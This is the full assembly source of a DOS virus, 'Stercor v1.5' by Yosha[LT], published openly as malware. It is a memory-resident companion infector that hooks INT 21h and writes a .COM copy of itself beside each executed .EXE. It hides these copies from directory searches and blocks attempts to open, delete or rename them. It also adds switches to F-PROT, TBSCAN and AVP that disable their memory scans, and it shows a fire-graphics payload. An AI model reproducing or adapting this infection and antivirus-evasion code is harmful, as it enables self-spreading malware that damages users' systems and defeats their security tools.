;                               Stercor v1.5
;                                  by
;                                Yosha[LT]

;* - Resident, full stealth spawning exe infector.
;* - Uses upper memory if available.
;* - DTA/FCB Findfirst/Next AND Win95 LFN findfirst/next stealth that makes
;    spawns completely disappear during searches.  Also prevents spawns from
;    being deleted, opened, renamed, or having their attributes messed with.
;* - Adds parameters to tbav, f-prot, and avp to avoid memory scans.
;* - Disables stealth if pkzip,arj,lha,or rar is in use.
;* - Graphical payload.

.model tiny
.code
.386                          
code_length  equ offset finish - offset start
paragraphs   equ ((code_length + 15 ) / 16) + 20h
org 0h

start:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               Execute old Program
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
start:        
        cld
;check and see if we should do payload
        in      al,40h
        cmp     al,0f0h
        jb      $+5
        call    do_fire
;deallocate most of memory
        mov     ah,4ah
        mov     bx,paragraphs   ;make room for psp also
        int     21h
;have we shat already?
        mov     ax,'SH'
        int     21h
        sub     ax,'IT'
        je      already_resident
;save allocation strategy
        mov     ax,5800h
        int     21h
        push    ax
;set allocation strategy to last fit, try upper memory first
        mov     ax,5801h
        push    ax
        mov     bx,82h
        int     21h
;get umb link state
        mov     ax,5802h
        int     21h
        push    bx
;set umb link state
        mov     ax,5803h
        push    ax
        mov     bx,1    ;add umb's to mcb chain
        int     21h
;allocate some memory
        mov     ah,48h
        mov     bx,paragraphs  
        int     21h
        jc      restore_strategy
;copy code to the allocated memory
        mov     es,ax
        xor     di,di
        mov     si,100h
        mov     cx,code_length
;anti f-prot heuristics        
        movsb
        loop    $ - 1
;now set the owner as dos so the mem isn't deallocated
        dec     ax
        mov     ds,ax
        mov     dx,8
        mov     word ptr ds:[1],dx
;if in upper mem set name to SC
        cmp     ax,9fffh
        jb      no_umb
        mov     word ptr ds:[8],'CS'
no_umb:
;hook int 21h
        push    es
        pop     ds
        mov     ax,3521h
        int     21h
        mov     word ptr [Old21],bx
        mov     word ptr [Old21+2],es
        mov     ax,2521h
        mov     dx,Offset Int_21_handler2
        int     21h
restore_strategy:
;restore umb link state
        pop     ax
        pop     bx
        int     21h
;restore allocation strategy
        pop     ax
        pop     bx
        int     21h
already_resident:
;get environment segment
        push    cs
        pop     ds
        mov     es,word ptr ds:[2ch]
        xor     di,di
        xor     ax,ax
;scan for 2 zeroes        
        scasb
        jnz     $ - 1
        scasb
        jnz     $ - 4
;find end of string
        scasw           ;skip 2 bytes
        mov     dx,di
        scasb
        jnz     $ - 1
;build parameter block
        mov     bx,offset parameter_block + 100h
        mov     word ptr [bx+4],cs
        mov     word ptr [bx+8],cs
        mov     word ptr [bx+12],cs
;change the .COM to .EXE
        mov     ax,'XE'
        sub     di,4
        stosw
        stosb
;execute file        
        push    es
        pop     ds
        push    cs
        pop     es
        mov     ax,4b00h
        int     21h
;get return code       
        mov     ah,4dh
        int     21h
terminate:
        mov     ah,4ch
        int     21h
parameter_block:
        dw      0       ;uses parent's environment
        dw      80h,?   ;pointer to commandline
        dw      5ch,?   ;fcb 1
        dw      6ch,?   ;fcb 2
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


message db      " Stercor by Yosha[LT] "


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               FCB Search Stealth
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
fcb_stealth:
        call    xchg_call_21
        or      al,al
        jnz     really_exit2
;get dta
        pusha
        push    es
        mov     al,2fh
        call    xchg_call_21
;adjust extended fcb's        
        cmp     byte ptr es:[bx],0ffh
        jne     $+5
        add     bx,7
;check size
        cmp     word ptr es:[bx+1dh],code_length
        pop     es
        popa
        jne     really_exit2
;redo dir
        mov     al,12h
        jmp     fcb_stealth
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               DTA File Search Stealth 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
dta_stealth:
        call    xchg_call_21
        pushf
        jc      really_exit
        pusha
        push    es
;get dta
        mov     al,2fh
        call    xchg_call_21
;if it's the length of the virus, redo the dir
        cmp     word ptr es:[bx+1ah],code_length
        pop     es
        popa
        jne     really_exit
;redo the dir!
        popf
        mov     al,4fh
        jmp     dta_stealth
really_exit:
        popf
really_exit2:
        retf    2
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                       Win95 LFN Stealth
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Win95Dir:
        Call    xchg_call_21
        pushf
        jc      Really_Exit
        cmp     word ptr es:[di+20h],code_length
        jnz     Really_Exit
        mov     ax,4f71h
        popf
        jmp     Win95Dir        
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               Int 21h Handler
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
DisableStealth:
        popa
        pop     ds
        pop     es
        pusha
        jmp     NoStealth
int_21_handler2:
        xchg    ah,al
        push    es
        push    ds
        pusha
        mov     al,62h
        Call    xchg_call_21
        dec     bx
        mov     es,bx
        mov     di,8
        mov     si,Offset Archivers
        push    cs
        pop     ds
        mov     cx,4
CheckNames:
        cmpsw
        jne     NoMatch
        cmpsb
        jz      DisableStealth
NoMatch:
        loop    CheckNames
DontDisableStealth:
        popa
        pop     ds
        pop     es
;dir?
        cmp     al,11h                  ;dos 6.22 dir
        je      fcb_stealth
        cmp     al,12h
        je      $ - 4

        cmp     al,4eh                  ;dos 7.0 dir
        je      dta_stealth
        cmp     al,4fh
        je      $ - 4

        cmp     ax,4e71h                ;windows 95 lfn dir
        je      Win95Dir
        cmp     ax,4f71h
        je      $ - 5
;open?
        pusha
        cmp     al,3dh
        je      deflect
;delete?
        cmp     al,41h
        je      deflect
;attrib?
        cmp     al,43h
        je      deflect
;rename?
        cmp     al,56h
        je      deflect
NoStealth:
;install check?
        cmp     ax,'HS'
        jne     $+6
        add     ax,101h                 ;ax='IT'
        iret
;file execute?
        cmp     ax,4bh
        je      infect
exit_21:
        popa
        xchg    ah,al
        jmp     dword ptr cs:[old21]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               Deflection Junk
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
deflect:
        mov     ax,3d00h
        call    call_21
        jc      exit_21
        xchg    bx,ax
;move to the end of it, save the size
        mov     ax,4202h
        xor     cx,cx
        cwd
        call    call_21
        push    ax
;close it        
        mov     ah,3eh
        call    call_21
;now check the filesize
        pop     ax
        cmp     ax,code_length
        jne     exit_21
;set carry flag, return with "file not found" error
        popa
        mov     ax,2
        stc
        retf    2
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               Infection Routine
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
infect:
;save some registers        
        push    ds
        push    es
;find the end of the asciz filename
        cld
        mov     si,dx
        mov     di,offset name_buffer
        push    cs
        pop     es
find_zero:       
        lodsb
        stosb
        or      al,al
        jnz     find_zero
;make sure extension is EXE
        lea     si,[di-4]
        push    cs
        pop     ds
        lodsw
        or      ax,2020h        ;lowercase letters
        cmp     ax,'xe'
        jne     done_infect
        
        lodsb
        or      al,20h          ;lowercase letter
        cmp     al,'e'
        jne     done_infect

dont_truncate:
;change extension in our buffer to COM
        lea     di,[si-3]
        mov     ax,'OC'
        stosw
        mov     al,'M'
        stosb
;use extended open to create and open the file if it doesn't exist, or leave 
;it and generate an error if it does.
        mov     ax,6c00h                ;extended open/create
        mov     bx,1                    ;write access
        mov     dx,10h                  ;if file doesn't exist, create it
        mov     si,offset name_buffer
        mov     cl,100001b              ;archive, normal
        call    call_21
        jc      done_infect             ;if it exists then leave
;write to file
        mov     bh,40h
        xchg    bx,ax
        mov     cx,code_length
        cwd
        call    call_21
;close it
        mov     ah,3eh
        call    call_21
done_infect:
;restore registers
        pop     es
        pop     ds
        popa
;execute program
        pusha
        push    ds
        push    es
        push    cs
        pop     es
        mov     si,dx
CheckFilename:        
        mov     di,Offset BadProggies
        mov     bp,4
CheckForAnother:
        push    si
        mov     cx,6
        repz    cmpsb
        pop     si
        jz      BadProggieFound        
        add     di,cx
        dec     bp
        jnz     CheckForAnother
        inc     si        
        cmp     byte ptr [si],0
        jne     CheckFilename
JmpExit21:
        pop     es
        pop     ds    
        jmp     exit_21
Return:
        Ret
BadProggieFound:
        mov     ax,0e07h
        int     10h
        pop     es
        push    es
        les     di,dword ptr es:[bx+2]  ;get seg/offset of command tail
        add     byte ptr es:[di],7      ;increase character count
        mov     al,0dh                  ;find end of tail
        scasb
        jnz     $ - 1
        dec     di
        push    cs
        pop     ds
        mov     si,Offset CommandLines  ;find command line that corresponds
FindCommandLine:                        ;with proggie (reversed)
        mov     ax,6                    ;(cx*4)+offset commandlines
        dec     bp
        mul     bp
        add     si,ax
CopyCommandLine:
        mov     al,' '                  
        stosb
        mov     cx,6
        rep     movsb
        mov     al,0dh
        stosb
        jmp     JmpExit21
BadProggies:
        db      'F-PROT'
        db      'TBSCAN'
        db      'AVPLIT'
        db      'AVP.EX'
CommandLines:
        db      '/M    '        ;avp
        db      '/M    '        ;avplite also
        db      'NM CO '        ;tbscan
        db      '/NOMEM'        ;fprot
archivers:
        db      'PKZ'
        db      'ARJ'
        db      'RAR'
        db      'LHA'
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                               Fire Routine w/ Logo
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
do_fire:

pixelskip      equ  (320*6)     ;skip 6 lines at the bottom cuz they are ugly
setback        equ  319         ;setting it to 321 or 319 makes the fire 
                                ;diagonal
Lstart         equ  (320*60)            ;where letter L begins
Tstart         equ  (320*60)+32         ;where letter T begins
_start         equ  (320*60)+64         ;where number 1 begins
Rstart         equ  (320*60)+96         ;where letter 9 begins
Sstart         equ  (320*60)+128        ;where letter 9 begins
Astart         equ  (320*60)+160        ;where letter 7 begins

Letter_color   equ  0ffh
LetterSpd      equ  111110b

        mov     ax,13h    ;switch into MCGA mode (aka easy-for-Yosha-mode)         
        int     10h       ;bios video services
          
        mov     dx,3c8h   ;set a new palette
        mov     ax,0ffh   ;start with color 255
pal_loop:
        out     dx,al     ;color to change
        inc     dx        ;3c9h=where we put the RGB values
         
        push    ax
        shr     ax,2
        out     dx,al     ;R value   
        xor     al,al     
        out     dx,al     ;G value (0)
        out     dx,al     ;B value (0)
        pop     ax     
     
        dec     dx        ;back to 3c8h
        dec     ax        ;next lower color
        jnz     pal_loop  ;but not zero, borders suck

        push    0a000h    ;point es to 0a000, seg of vga memory
        pop     es
again:          
        push    es        ;this chunk sets the bottom line to the 1 value
        push    cs
        pop     es
        mov     di,offset buffer+(64000-320)+100h   ;last line
        mov     cx,320
okeedokee:
        in      al,40h         ;quasi random value from timer            
        xor     al,0
RanPatch equ $ - 1
        mov     byte ptr [RanPatch+100h],al
        stosb                   ;flush it
        loop    okeedokee       ;do it again and again and again
     
        mov     si,(offset buffer)+100h
        mov     cx,(320*200)
genfire:     
        xor     ah,ah
     
        mov     al,byte ptr [si+1]       ;pixel to the right
        add     al,byte ptr [si-1]       ;pixel to the left
        adc     ah,0     
        shr     ax,1                     ;average em
     
        add     al,byte ptr [si+321]     ;below and right
        adc     ah,0
        add     al,byte ptr [si+319]     ;below and left
        adc     ah,0
        add     al,byte ptr [si+320]     ;pixel directly below
        adc     ah,0
        shr     ax,2
     
        add     al,byte ptr [si]         ;current pixel
        adc     ah,0

        shr     ax,1                     
        or      al,al
        jz      $+3
        dec     ax
        mov     byte ptr [si-setback],al ;store it a line back so it all 
                                         ;averages ok
        inc     si                       ;next pixel
        loop    genfire                  ;do the rest of the pixels
     
        call    logo          
     
        pop     es                       ;es=0a000h
        xor     di,di                    ;start at beginning of screen
        mov     si,offset buffer+100h    ;copy buffer to screen
        mov     cx,(64000-(pixelskip))/4 ;except last 5 lines
        rep     movsd                    ;this copies it all to the screen

        sti     
        in      al,60h
        cmp     al,129
        jne     again

        mov     ax,3
        int     10h

        ret

logo:
        push    ds                  
        push    0f000h                        ;seg where graphics char's are
        pop     ds
          
        push    0h
        pop     fs
        test    byte ptr fs:[46ch],LetterSpd  ;is it time?
        jnz     hhhhhhhhhhhhhhhh

;put down some letters
        mov     cx,6
        mov     si,offset letters+100h
letter_loop:        
        push    cx
        
        db      2eh
        lodsw
        xchg    di,ax
        db      2eh
        lodsw
        push    si
        xchg    si,ax
        call    write_letter

        pop     si
        pop     cx
        loop    letter_loop
        
hhhhhhhhhhhhhhhh:
        pop     ds
        ret
write_letter:
        mov     cx,8
loop1:          
        push    cx
        lodsb               ;load row of bits for characters
        mov     bh,al
        mov     cl,8
loop1_5:                 ;loop 1.5          
        push    cx
        mov     al,bh
        mov     cl,8

loop2:
        push    cx     
        shl     al,1                ;shift bit into carry
        mov     bl,letter_color     ;if carry then color of letter else 0
        jc      $+4
        xor     bl,bl               ;otherwise black
                    
        xchg    bx,ax
        mov     cl,4
        rep     stosb
        xchg    bx,ax
        pop     cx
        loop    loop2
        add     di,320-32
        pop     cx
        loop    loop1_5
        pop     cx
        loop    loop1
        ret

;pointer to letters for fire, and also offsets into fire buffer
letters dw      offset buffer+Lstart+100h,0fa6eh+(8*'L')
        dw      offset buffer+TStart+100h,0fa6eh+(8*'T')
        dw      offset buffer+_start+100h,0fa6eh+(8*'1')           
        dw      offset buffer+Rstart+100h,0fa6eh+(8*'9')          
        dw      offset buffer+SStart+100h,0fa6eh+(8*'9')
        dw      offset buffer+AStart+100h,0fa6eh+(8*'7')
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

xchg_call_21:        
        xchg    ah,al
call_21:
        pushf
        push    cs
        push    offset return
        db      0eah
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
finish:
old21           dd      ?        
name_buffer:
prebuffer:
        db      setback dup (?)
buffer:               
        end     start
